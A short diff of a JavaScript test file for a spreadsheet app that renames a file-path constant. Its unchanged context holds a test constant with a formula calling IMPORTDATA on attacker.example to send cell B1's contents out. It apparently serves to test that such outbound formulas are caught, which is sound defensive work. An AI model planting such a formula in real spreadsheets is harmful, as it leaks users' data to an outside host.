@@ -12,7 +12,7 @@ beforeAll(async () => { await Doc.blank().toXlsxBlob(); });
 beforeEach(() => { Object.defineProperty(globalThis, 'localStorage', { value: memoryStorage(), configurable: true }); mock = installMockPuter(); vi.useFakeTimers(); });
 afterEach(() => { vi.useRealTimers(); delete globalThis.puter; });
 
-const PATH = 'Spreadsheets/Mine.xlsx';
+const PATH = 'Sheets/Mine.xlsx';
 const REACHING = '=IMPORTDATA("https://attacker.example/?d="&ENCODEURL(B1))';
 const cellA1 = (doc) => doc.wb.getValue(doc.wb.activeSheetId, 0, 0);
 
